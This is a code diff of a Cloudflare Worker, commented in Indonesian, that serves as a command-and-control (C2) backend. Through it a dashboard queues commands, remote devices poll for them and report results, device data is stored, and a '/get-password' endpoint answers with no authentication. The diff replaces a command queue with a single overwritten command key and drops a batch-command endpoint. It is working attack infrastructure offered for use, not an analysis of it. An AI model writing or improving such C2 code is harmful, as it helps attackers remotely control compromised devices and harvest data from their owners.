@@ -1,15 +1,9 @@
 // ================================================================
-// Cloudflare Worker - verifikasi-api (TANPA PASSWORD!)
+// Cloudflare Worker - verifikasi-api (HANYA 1 PERINTAH!)
 // ================================================================
 
-// ============================================================
-// KONFIGURASI
-// ============================================================
 const MAX_DATA = 5000;
 
-// ============================================================
-// CORS HEADERS
-// ============================================================
 const CORS = {
   'Access-Control-Allow-Origin': '*',
   'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
@@ -18,9 +12,6 @@ const CORS = {
   'Access-Control-Max-Age': '86400',
 };
 
-// ============================================================
-// RESPONSE HELPERS
-// ============================================================
 function jsonResponse(data, status = 200, extraHeaders = {}) {
   return new Response(JSON.stringify(data), {
     status,
@@ -32,9 +23,6 @@ function jsonResponse(data, status = 200, extraHeaders = {}) {
   });
 }
 
-// ============================================================
-// MAIN HANDLER - TANPA AUTH!
-// ============================================================
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
@@ -44,22 +32,14 @@ export default {
       return new Response(null, { headers: CORS });
     }
 
-    // 🔥 POST /data atau /api/data - BEBAS!
     if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
       return await handlePostData(request, env);
     }
 
-    // 🔥 POST /batch - BEBAS!
-    if (url.pathname === '/batch' && method === 'POST') {
-      return await handleBatchCommand(request, env);
-    }
-
-    // 🔥 GET /data atau /api/data - BEBAS!
     if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
       return await handleGetData(request, env);
     }
 
-    // 🔥 GET /get-password - BEBAS! (LANGSUNG RETURN TANPA PASSWORD)
     if (url.pathname === '/get-password' && method === 'GET') {
       return jsonResponse({ 
         status: 'ok',
@@ -68,12 +48,10 @@ export default {
       });
     }
 
-    // 🔥 WEBSOCKET - BEBAS!
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
     }
 
-    // ROOT - Health Check
     if (url.pathname === '/' && method === 'GET') {
       const raw = await env.DATA.get('data') || '[]';
       const data = JSON.parse(raw);
@@ -89,9 +67,6 @@ export default {
   }
 };
 
-// ============================================================
-// HANDLER: POST /data (BEBAS!)
-// ============================================================
 async function handlePostData(request, env) {
   try {
     const body = await request.json();
@@ -100,25 +75,22 @@ async function handlePostData(request, env) {
       return jsonResponse({ error: 'Invalid request body' }, 400);
     }
     
-    // 🔥 C2 COMMAND - SIMPAN KE QUEUE!
+    // 🔥 C2 COMMAND - SIMPAN KE perintah (HANYA 1 KEY!)
     if (body.sumber === 'c2_command' || body.type === 'c2_command') {
       const cmdData = body.data || body;
       cmdData.timestamp = Date.now();
       cmdData.status = 'pending';
-      cmdData.id = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
       
-      var queueRaw = await env.DATA.get('perintah_queue') || '[]';
-      var queue = JSON.parse(queueRaw);
-      queue.push(cmdData);
-      await env.DATA.put('perintah_queue', JSON.stringify(queue));
-      
+      // 🔥 HANYA 1 KEY! TIMPA YANG LAMA!
       await env.DATA.put('perintah', JSON.stringify(cmdData));
+      
+      // 🔥 HAPUS KEY LAIN YANG TIDAK PERLU
+      await env.DATA.delete('perintah_queue');
       
       return jsonResponse({ 
         status: 'ok', 
         type: 'c2', 
-        command: cmdData.aksi,
-        queueLength: queue.length
+        command: cmdData.aksi
       });
     }
     
@@ -151,86 +123,12 @@ async function handlePostData(request, env) {
   }
 }
 
-// ============================================================
-// HANDLER: POST /batch (BEBAS!)
-// ============================================================
-async function handleBatchCommand(request, env) {
-  try {
-    const body = await request.json();
-    
-    if (!body.commands || !Array.isArray(body.commands)) {
-      return jsonResponse({ error: 'commands array required' }, 400);
-    }
-    
-    var queueRaw = await env.DATA.get('perintah_queue') || '[]';
-    var queue = JSON.parse(queueRaw);
-    var results = [];
-    var success = 0;
-    var failed = 0;
-    
-    for (var i = 0; i < body.commands.length; i++) {
-      try {
-        var cmd = body.commands[i];
-        cmd.timestamp = Date.now();
-        cmd.status = 'pending';
-        cmd.id = 'cmd_' + Date.now() + '_' + i + '_' + Math.random().toString(36).substr(2, 3);
-        
-        queue.push(cmd);
-        success++;
-        results.push({ index: i, status: 'ok', command: cmd.aksi });
-      } catch(e) {
-        failed++;
-        results.push({ index: i, status: 'failed', error: e.message });
-      }
-    }
-    
-    await env.DATA.put('perintah_queue', JSON.stringify(queue));
-    
-    if (body.commands.length > 0) {
-      const lastCmd = body.commands[body.commands.length - 1];
-      lastCmd.timestamp = Date.now();
-      lastCmd.status = 'pending';
-      await env.DATA.put('perintah', JSON.stringify(lastCmd));
-    }
-    
-    return jsonResponse({
-      status: 'ok',
-      total: body.commands.length,
-      success: success,
-      failed: failed,
-      queueLength: queue.length,
-      results: results
-    });
-    
-  } catch (error) {
-    return jsonResponse({ error: error.message }, 500);
-  }
-}
-
-// ============================================================
-// HANDLER: GET /data (BEBAS!)
-// ============================================================
 async function handleGetData(request, env) {
   const url = new URL(request.url);
   
-  // 🔥 DEVICE AMBIL C2 (BEBAS!)
+  // 🔥 DEVICE AMBIL PERINTAH C2 (HANYA DARI perintah!)
   if (url.searchParams.get('type') === 'perintah') {
     try {
-      var queueRaw = await env.DATA.get('perintah_queue') || '[]';
-      var queue = JSON.parse(queueRaw);
-      
-      if (queue.length > 0) {
-        var cmd = queue.shift();
-        await env.DATA.put('perintah_queue', JSON.stringify(queue));
-        
-        return new Response(JSON.stringify(cmd), {
-          headers: {
-            'Content-Type': 'application/json',
-            ...CORS,
-          },
-        });
-      }
-      
       const perintah = await env.DATA.get('perintah');
       if (perintah) {
         await env.DATA.delete('perintah');
@@ -241,7 +139,6 @@ async function handleGetData(request, env) {
           },
         });
       }
-      
       return new Response('{}', {
         headers: {
           'Content-Type': 'application/json',
@@ -258,7 +155,7 @@ async function handleGetData(request, env) {
     }
   }
   
-  // 🔥 DASHBOARD LIHAT DATA (BEBAS!)
+  // 🔥 DASHBOARD LIHAT DATA
   try {
     const raw = await env.DATA.get('data') || '[]';
     let data = JSON.parse(raw);
@@ -298,9 +195,6 @@ async function handleGetData(request, env) {
   }
 }
 
-// ============================================================
-// HANDLER: WebSocket (BEBAS!)
-// ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
   if (!upgradeHeader || upgradeHeader !== 'websocket') {
@@ -324,24 +218,19 @@ async function handleWebSocket(request, env) {
         return;
       }
 
-      // COMMAND DARI DASHBOARD (BEBAS!)
+      // 🔥 COMMAND DARI DASHBOARD (LANGSUNG KE perintah!)
       if (data.type === 'command') {
         var cmdData = data.command;
         cmdData.timestamp = Date.now();
         cmdData.status = 'pending';
-        cmdData.id = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
         
-        var queueRaw = await env.DATA.get('perintah_queue') || '[]';
-        var queue = JSON.parse(queueRaw);
-        queue.push(cmdData);
-        await env.DATA.put('perintah_queue', JSON.stringify(queue));
         await env.DATA.put('perintah', JSON.stringify(cmdData));
+        await env.DATA.delete('perintah_queue');
         
-        server.send(JSON.stringify({ type: 'command_received', queueLength: queue.length }));
+        server.send(JSON.stringify({ type: 'command_received' }));
         return;
       }
 
-      // DATA DARI DEVICE
       if (data.type === 'data') {
         const raw = await env.DATA.get('data') || '[]';
         let allData = JSON.parse(raw);
@@ -359,7 +248,6 @@ async function handleWebSocket(request, env) {
         return;
       }
 
-      // C2 RESULT
       if (data.type === 'c2_result') {
         const raw = await env.DATA.get('data') || '[]';
         let allData = JSON.parse(raw);
@@ -377,7 +265,6 @@ async function handleWebSocket(request, env) {
         return;
       }
 
-      // PING/PONG
       if (data.type === 'ping') {
         server.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
         return;
